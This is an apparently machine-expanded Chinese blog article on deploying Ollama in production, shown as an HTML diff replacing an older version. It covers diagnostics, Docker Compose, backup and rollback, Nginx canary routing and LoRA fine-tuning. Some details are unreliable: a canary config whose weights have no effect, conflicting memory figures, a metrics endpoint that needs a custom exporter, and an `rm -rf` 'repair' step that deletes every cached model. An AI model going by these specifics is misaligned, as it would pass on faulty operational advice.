@@ -202,102 +202,99 @@
             <h1 id="expanded-blog-Ollama"><a href="#expanded-blog-Ollama" class="headerlink" title="[expanded] [blog] Ollama"></a>[expanded] [blog] Ollama</h1><blockquote>
 <p>原始问题: [blog] Ollama</p>
 </blockquote>
-<h1 id="Ollama-本地大模型运行框架：从部署到生产级实践"><a href="#Ollama-本地大模型运行框架：从部署到生产级实践" class="headerlink" title="Ollama 本地大模型运行框架：从部署到生产级实践"></a>Ollama 本地大模型运行框架：从部署到生产级实践</h1><h2 id="一、背景：为什么需要本地-LLM-运行时"><a href="#一、背景：为什么需要本地-LLM-运行时" class="headerlink" title="一、背景：为什么需要本地 LLM 运行时"></a>一、背景：为什么需要本地 LLM 运行时</h2><p>在云端 LLM API 成本高企、数据隐私合规要求严格的场景下，本地部署大语言模型成为刚需。典型场景包括：金融机构内网环境无法访问公网 API、医疗行业需满足 HIPAA 合规、研发团队需要离线代码补全能力、以及高频调用场景下云端 API 成本不可控。Ollama 作为轻量级 LLM 运行时，通过 Go 实现跨平台支持（macOS&#x2F;Linux&#x2F;Windows），内置模型量化与推理优化，提供 REST API 与 CLI 双接口，成为本地部署的首选方案。</p>
-<p>相比传统方案（如直接使用 Transformers + PyTorch），Ollama 的核心优势在于：开箱即用的模型管理（pull&#x2F;run&#x2F;rm）、自动内存管理（根据硬件动态调整量化策略）、统一的 API 接口（兼容 OpenAI Chat Completions 格式）。但需注意其局限性：模型选择受限于官方仓库、推理性能不如 vLLM 等专用框架、缺乏分布式推理能力。在选型时需根据实际场景权衡易用性与性能。</p>
-<h2 id="二、诊断步骤：验证环境与模型可用性"><a href="#二、诊断步骤：验证环境与模型可用性" class="headerlink" title="二、诊断步骤：验证环境与模型可用性"></a>二、诊断步骤：验证环境与模型可用性</h2><p>在正式部署前，必须通过 read-only 命令验证硬件资源与模型兼容性，避免运行时 OOM 或性能瓶颈：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 验证 Ollama 服务状态</span></span><br><span class="line">curl http://localhost:11434/api/tags  <span class="comment"># 返回已安装模型列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 检查系统资源（以 7B 模型为例，需 8GB+ 可用内存）</span></span><br><span class="line">free -h | grep Mem  <span class="comment"># Linux</span></span><br><span class="line">vm_stat | grep free  <span class="comment"># macOS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 测试模型推理延迟（baseline 性能）</span></span><br><span class="line"><span class="keyword">time</span> ollama run llama3.2 <span class="string">&quot;Hello&quot;</span> --verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 验证 GPU 可用性（如有）</span></span><br><span class="line">nvidia-smi  <span class="comment"># NVIDIA GPU</span></span><br><span class="line">system_profiler SPDisplaysDataType | grep Metal  <span class="comment"># Apple Silicon</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 检查模型文件完整性</span></span><br><span class="line">ollama show llama3.2 --modelfile  <span class="comment"># 查看量化配置与参数规模</span></span><br></pre></td></tr></table></figure>
+<h1 id="深度解析-Ollama-本地大模型运行框架：从部署到生产级实践"><a href="#深度解析-Ollama-本地大模型运行框架：从部署到生产级实践" class="headerlink" title="深度解析 Ollama 本地大模型运行框架：从部署到生产级实践"></a>深度解析 Ollama 本地大模型运行框架：从部署到生产级实践</h1><h2 id="一、背景：为什么需要本地化大模型运行框架"><a href="#一、背景：为什么需要本地化大模型运行框架" class="headerlink" title="一、背景：为什么需要本地化大模型运行框架"></a>一、背景：为什么需要本地化大模型运行框架</h2><p>在云端 LLM API 成本高昂、数据隐私合规要求严格的场景下，本地化部署大语言模型成为刚需。典型场景包括：金融机构处理敏感客户数据、医疗系统分析病历信息、企业内部知识库问答系统。传统方案需要深度学习工程师手动配置 CUDA 环境、模型量化、推理优化，运维成本极高。</p>
+<p>Ollama 作为 Go 实现的轻量级框架，将模型下载、量化、推理服务封装成类似 Docker 的命令行工具。其核心价值在于：统一的模型格式（GGUF）、自动硬件检测（CUDA&#x2F;Metal&#x2F;CPU）、开箱即用的 REST API。对比 vLLM 需要 Python 环境和复杂依赖，Ollama 单二进制文件即可运行，适合快速验证和边缘部署。</p>
+<p>关键技术选型考量：模型大小与硬件匹配（7B 模型需 16GB 内存）、推理延迟要求（CPU 推理 token&#x2F;s &lt; 10）、并发处理能力（单实例 QPS &lt; 5）。生产环境需评估是否需要 GPU 加速、是否支持流式输出、API 兼容性（OpenAI 格式）。</p>
+<h2 id="二、诊断步骤：验证-Ollama-运行状态"><a href="#二、诊断步骤：验证-Ollama-运行状态" class="headerlink" title="二、诊断步骤：验证 Ollama 运行状态"></a>二、诊断步骤：验证 Ollama 运行状态</h2><p>部署后首先执行只读命令验证环境：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查服务进程和监听端口</span></span><br><span class="line">ps aux | grep ollama</span><br><span class="line">netstat -tlnp | grep 11434</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证模型列表和元数据</span></span><br><span class="line">ollama list</span><br><span class="line">ollama show llama3.2 --modelfile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试推理性能（记录首 token 延迟和吞吐）</span></span><br><span class="line"><span class="keyword">time</span> ollama run llama3.2 <span class="string">&quot;Explain SRE in 10 words&quot;</span> --verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查系统资源占用</span></span><br><span class="line">nvidia-smi  <span class="comment"># GPU 场景</span></span><br><span class="line">top -p $(pgrep ollama)  <span class="comment"># CPU/内存</span></span><br></pre></td></tr></table></figure>
 
-<p>关键指标：模型加载时间（应 &lt; 30s）、首 token 延迟（应 &lt; 2s）、内存占用（7B 模型约 4-6GB）。若加载超时或 OOM，需切换更小模型（如 3B）或调整量化参数。</p>
-<h2 id="三、生产部署：容器化与高可用配置"><a href="#三、生产部署：容器化与高可用配置" class="headerlink" title="三、生产部署：容器化与高可用配置"></a>三、生产部署：容器化与高可用配置</h2><h3 id="3-1-Docker-Compose-标准部署"><a href="#3-1-Docker-Compose-标准部署" class="headerlink" title="3.1 Docker Compose 标准部署"></a>3.1 Docker Compose 标准部署</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">ollama:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">ollama/ollama:0.1.29</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">ollama-prod</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;11434:11434&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./models:/root/.ollama</span>  <span class="comment"># 持久化模型文件</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/dev/shm:/dev/shm</span>       <span class="comment"># 共享内存加速</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">OLLAMA_MODELS=/root/.ollama/models</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">OLLAMA_NUM_PARALLEL=2</span>   <span class="comment"># 并发请求数</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">resources:</span></span><br><span class="line">        <span class="attr">limits:</span></span><br><span class="line">          <span class="attr">memory:</span> <span class="string">16G</span>           <span class="comment"># 防止 OOM</span></span><br></pre></td></tr></table></figure>
+<p>关键指标验证：模型加载时间（应 &lt; 30s）、首 token 延迟（GPU &lt; 500ms，CPU &lt; 2s）、内存占用（7B 模型约 8-12GB）。若 <code>ollama list</code> 返回空或模型状态异常，检查 <code>~/.ollama/models</code> 目录权限和磁盘空间。</p>
+<p>API 健康检查：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 验证 REST 接口</span></span><br><span class="line">curl http://localhost:11434/api/tags</span><br><span class="line">curl -X POST http://localhost:11434/api/generate -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;model&quot;: &quot;llama3.2&quot;,</span></span><br><span class="line"><span class="string">  &quot;prompt&quot;: &quot;Test&quot;,</span></span><br><span class="line"><span class="string">  &quot;stream&quot;: false</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p>生产环境必须配置：健康检查（<code>/api/tags</code> 端点）、日志轮转（避免磁盘打满）、资源限制（防止单容器耗尽宿主机资源）。模型文件通过 volume 持久化，避免容器重启后重新下载。</p>
-<h3 id="3-2-模型预热与版本管理"><a href="#3-2-模型预热与版本管理" class="headerlink" title="3.2 模型预热与版本管理"></a>3.2 模型预热与版本管理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预拉取生产模型（避免首次请求冷启动）</span></span><br><span class="line">docker <span class="built_in">exec</span> ollama-prod ollama pull llama3.2:7b</span><br><span class="line">docker <span class="built_in">exec</span> ollama-prod ollama pull qwen2.5:7b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建模型别名（便于灰度切换）</span></span><br><span class="line">docker <span class="built_in">exec</span> ollama-prod ollama <span class="built_in">cp</span> llama3.2:7b llama3-stable</span><br><span class="line">docker <span class="built_in">exec</span> ollama-prod ollama <span class="built_in">cp</span> qwen2.5:7b qwen-canary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证模型可用性</span></span><br><span class="line">curl -X POST http://localhost:11434/api/generate \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;model&quot;:&quot;llama3-stable&quot;,&quot;prompt&quot;:&quot;test&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>若返回 <code>connection refused</code>，检查防火墙规则和 <code>OLLAMA_HOST</code> 环境变量配置。</p>
+<h2 id="三、生产部署：容器化与高可用架构"><a href="#三、生产部署：容器化与高可用架构" class="headerlink" title="三、生产部署：容器化与高可用架构"></a>三、生产部署：容器化与高可用架构</h2><h3 id="3-1-Docker-Compose-最佳实践"><a href="#3-1-Docker-Compose-最佳实践" class="headerlink" title="3.1 Docker Compose 最佳实践"></a>3.1 Docker Compose 最佳实践</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">ollama:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">ollama/ollama:latest</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">resources:</span></span><br><span class="line">        <span class="attr">reservations:</span></span><br><span class="line">          <span class="attr">devices:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">driver:</span> <span class="string">nvidia</span></span><br><span class="line">              <span class="attr">count:</span> <span class="number">1</span></span><br><span class="line">              <span class="attr">capabilities:</span> [<span class="string">gpu</span>]</span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ollama_data:/root/.ollama</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">OLLAMA_KEEP_ALIVE=24h</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">OLLAMA_NUM_PARALLEL=4</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">OLLAMA_MAX_LOADED_MODELS=2</span></span><br><span class="line">    <span class="attr">healthcheck:</span></span><br><span class="line">      <span class="attr">test:</span> [<span class="string">&quot;CMD&quot;</span>, <span class="string">&quot;ollama&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br><span class="line">      <span class="attr">interval:</span> <span class="string">30s</span></span><br><span class="line">      <span class="attr">timeout:</span> <span class="string">10s</span></span><br><span class="line">      <span class="attr">retries:</span> <span class="number">3</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">ollama_data:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">local</span></span><br></pre></td></tr></table></figure>
 
-<p>通过别名机制实现模型版本管理：生产流量指向 <code>llama3-stable</code>，新模型验证使用 <code>qwen-canary</code>，验证通过后通过 <code>ollama cp</code> 原子切换。</p>
-<h3 id="3-3-反向代理与限流"><a href="#3-3-反向代理与限流" class="headerlink" title="3.3 反向代理与限流"></a>3.3 反向代理与限流</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">upstream</span> ollama_backend &#123;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:11434</span> max_fails=<span class="number">3</span> fail_timeout=<span class="number">30s</span>;</span><br><span class="line">    <span class="attribute">keepalive</span> <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">8080</span>;</span><br><span class="line">    <span class="section">location</span> /v1/ &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://ollama_backend/api/;</span><br><span class="line">        <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Connection <span class="string">&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 限流：每 IP 每秒 10 请求</span></span><br><span class="line">        <span class="attribute">limit_req</span> zone=ollama_limit burst=<span class="number">20</span> nodelay;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 超时控制</span></span><br><span class="line">        <span class="attribute">proxy_read_timeout</span> <span class="number">120s</span>;</span><br><span class="line">        <span class="attribute">proxy_send_timeout</span> <span class="number">120s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关键配置说明：<code>OLLAMA_KEEP_ALIVE</code> 控制模型卸载时间（避免频繁加载）、<code>NUM_PARALLEL</code> 限制并发请求数（防止 OOM）、<code>MAX_LOADED_MODELS</code> 控制内存占用。生产环境建议挂载独立数据卷，避免容器重启丢失已下载模型。</p>
+<h3 id="3-2-备份与回滚策略"><a href="#3-2-备份与回滚策略" class="headerlink" title="3.2 备份与回滚策略"></a>3.2 备份与回滚策略</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份模型和配置</span></span><br><span class="line">tar -czf ollama-backup-$(<span class="built_in">date</span> +%F).tar.gz \</span><br><span class="line">  ~/.ollama/models \</span><br><span class="line">  /etc/systemd/system/ollama.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 版本锁定（避免自动更新）</span></span><br><span class="line">docker pull ollama/ollama:0.1.29</span><br><span class="line">docker tag ollama/ollama:0.1.29 ollama/ollama:stable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 回滚操作</span></span><br><span class="line">docker stop ollama</span><br><span class="line">docker run -d --name ollama \</span><br><span class="line">  -v ollama_data:/root/.ollama \</span><br><span class="line">  ollama/ollama:stable</span><br></pre></td></tr></table></figure>
 
-<p>生产环境必须通过 Nginx&#x2F;Envoy 实现：请求限流（防止单用户打爆服务）、超时控制（长文本生成需调整 timeout）、连接复用（keepalive 减少握手开销）。</p>
-<h2 id="四、常见坑与排查手册"><a href="#四、常见坑与排查手册" class="headerlink" title="四、常见坑与排查手册"></a>四、常见坑与排查手册</h2><h3 id="4-1-内存泄漏与-OOM"><a href="#4-1-内存泄漏与-OOM" class="headerlink" title="4.1 内存泄漏与 OOM"></a>4.1 内存泄漏与 OOM</h3><p><strong>现象</strong>：运行数小时后容器被 OOM Killer 杀死，日志显示 <code>signal: killed</code>。</p>
-<p><strong>根因</strong>：Ollama 0.1.x 版本存在内存泄漏，长时间运行后未释放推理缓存。</p>
-<p><strong>解决方案</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 临时方案：定时重启容器</span></span><br><span class="line">0 */6 * * * docker restart ollama-prod</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根本方案：升级到 0.1.29+ 并启用内存限制</span></span><br><span class="line">docker update --memory=12G --memory-swap=12G ollama-prod</span><br></pre></td></tr></table></figure>
+<p>模型文件损坏时的强制修复：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清理损坏的模型缓存</span></span><br><span class="line"><span class="built_in">rm</span> -rf ~/.ollama/models/manifests/*</span><br><span class="line"><span class="built_in">rm</span> -rf ~/.ollama/models/blobs/sha256-*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新拉取并验证</span></span><br><span class="line">ollama pull llama3.2</span><br><span class="line"><span class="built_in">sha256sum</span> ~/.ollama/models/blobs/sha256-* | <span class="built_in">tee</span> model-checksums.txt</span><br></pre></td></tr></table></figure>
 
-<h3 id="4-2-模型加载失败"><a href="#4-2-模型加载失败" class="headerlink" title="4.2 模型加载失败"></a>4.2 模型加载失败</h3><p><strong>现象</strong>：<code>ollama run</code> 卡住或报错 <code>failed to load model</code>。</p>
-<p><strong>排查步骤</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查磁盘空间（模型文件可能损坏）</span></span><br><span class="line"><span class="built_in">df</span> -h /root/.ollama</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证模型文件完整性</span></span><br><span class="line"><span class="built_in">sha256sum</span> /root/.ollama/models/blobs/sha256-*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理损坏模型重新拉取</span></span><br><span class="line">ollama <span class="built_in">rm</span> llama3.2 &amp;&amp; ollama pull llama3.2</span><br></pre></td></tr></table></figure>
+<h3 id="3-3-灰度发布与流量控制"><a href="#3-3-灰度发布与流量控制" class="headerlink" title="3.3 灰度发布与流量控制"></a>3.3 灰度发布与流量控制</h3><p>使用 Nginx 实现多版本模型的金丝雀发布：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">upstream</span> ollama_stable &#123;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:11434</span> weight=<span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">upstream</span> ollama_canary &#123;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:11435</span> weight=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="section">location</span> /v1/chat/completions &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://ollama_stable;</span><br><span class="line">        <span class="attribute">proxy_next_upstream</span> <span class="literal">error</span> timeout;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 基于 Header 路由到 Canary</span></span><br><span class="line">        <span class="attribute">if</span> (<span class="variable">$http_x_model_version</span> = <span class="string">&quot;canary&quot;</span>) &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://ollama_canary;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="4-3-推理性能退化"><a href="#4-3-推理性能退化" class="headerlink" title="4.3 推理性能退化"></a>4.3 推理性能退化</h3><p><strong>现象</strong>：首 token 延迟从 1s 增加到 10s+。</p>
-<p><strong>根因</strong>：CPU 模式下未启用 AVX2&#x2F;AVX512 指令集，或 GPU 显存碎片化。</p>
-<p><strong>优化方案</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 验证 CPU 指令集支持</span></span><br><span class="line">lscpu | grep -E <span class="string">&#x27;avx|fma&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制使用 GPU（如有）</span></span><br><span class="line">OLLAMA_GPU=1 ollama run llama3.2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清理 GPU 缓存</span></span><br><span class="line">docker <span class="built_in">exec</span> ollama-prod sh -c <span class="string">&#x27;echo 3 &gt; /proc/sys/vm/drop_caches&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>配合 Prometheus 监控关键指标：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 暴露 Ollama 指标（需自定义 exporter）</span></span><br><span class="line">curl http://localhost:11434/metrics | grep -E <span class="string">&#x27;ollama_(request_duration|model_load_time|gpu_memory)&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="4-4-并发请求阻塞"><a href="#4-4-并发请求阻塞" class="headerlink" title="4.4 并发请求阻塞"></a>4.4 并发请求阻塞</h3><p><strong>现象</strong>：单请求正常，并发 5+ 请求时全部超时。</p>
-<p><strong>根因</strong>：默认 <code>OLLAMA_NUM_PARALLEL=1</code>，无法处理并发。</p>
-<p><strong>解决方案</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 调整并发数（需重启容器）</span></span><br><span class="line">docker run -e OLLAMA_NUM_PARALLEL=4 ollama/ollama</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证并发能力</span></span><br><span class="line"><span class="built_in">seq</span> 10 | xargs -P 10 -I &#123;&#125; curl -X POST http://localhost:11434/api/generate \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;model&quot;:&quot;llama3.2&quot;,&quot;prompt&quot;:&quot;test &#123;&#125;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="四、模型微调与优化实战"><a href="#四、模型微调与优化实战" class="headerlink" title="四、模型微调与优化实战"></a>四、模型微调与优化实战</h2><h3 id="4-1-LLaMA-Factory-微调流程"><a href="#4-1-LLaMA-Factory-微调流程" class="headerlink" title="4.1 LLaMA-Factory 微调流程"></a>4.1 LLaMA-Factory 微调流程</h3><p>硬件选型：Mac M1&#x2F;M2 使用 MPS 后端（Metal Performance Shaders），Linux 优先 CUDA。7B 模型全量微调需 40GB+ 显存，LoRA 微调降至 16GB。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动 WebUI 进行可视化配置</span></span><br><span class="line">docker run -d --gpus all \</span><br><span class="line">  -v $(<span class="built_in">pwd</span>)/data:/app/data \</span><br><span class="line">  -p 7860:7860 \</span><br><span class="line">  hiyouga/llama-factory:latest \</span><br><span class="line">  llamafactory-cli webui</span><br><span class="line"></span><br><span class="line"><span class="comment"># CLI 方式训练（生产推荐）</span></span><br><span class="line">llamafactory-cli train \</span><br><span class="line">  --model_name_or_path meta-llama/Llama-2-7b-hf \</span><br><span class="line">  --dataset alpaca_zh \</span><br><span class="line">  --finetuning_type lora \</span><br><span class="line">  --output_dir ./checkpoints \</span><br><span class="line">  --per_device_train_batch_size 4 \</span><br><span class="line">  --gradient_accumulation_steps 8 \</span><br><span class="line">  --num_train_epochs 3 \</span><br><span class="line">  --learning_rate 5e-5 \</span><br><span class="line">  --logging_steps 10 \</span><br><span class="line">  --save_steps 500</span><br></pre></td></tr></table></figure>
 
-<h3 id="4-5-流式输出中断"><a href="#4-5-流式输出中断" class="headerlink" title="4.5 流式输出中断"></a>4.5 流式输出中断</h3><p><strong>现象</strong>：使用 <code>/api/generate</code> 流式接口时，输出到一半断开连接。</p>
-<p><strong>根因</strong>：Nginx 默认 <code>proxy_buffering on</code> 导致流式响应被缓冲。</p>
-<p><strong>修复配置</strong>：</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /api/generate &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://ollama_backend;</span><br><span class="line">    <span class="attribute">proxy_buffering</span> <span class="literal">off</span>;           <span class="comment"># 关键配置</span></span><br><span class="line">    <span class="attribute">proxy_cache</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">chunked_transfer_encoding</span> <span class="literal">on</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关键参数调优：<code>gradient_accumulation_steps</code> 模拟大 batch（显存不足时）、<code>warmup_ratio=0.1</code> 稳定训练初期、<code>fp16=True</code> 减半显存占用。训练过程监控 GPU 利用率（应 &gt; 80%）和损失曲线（应平滑下降）。</p>
+<h3 id="4-2-量化与推理加速"><a href="#4-2-量化与推理加速" class="headerlink" title="4.2 量化与推理加速"></a>4.2 量化与推理加速</h3><p>Ollama 默认使用 Q4_K_M 量化（4-bit），可手动转换：</p>
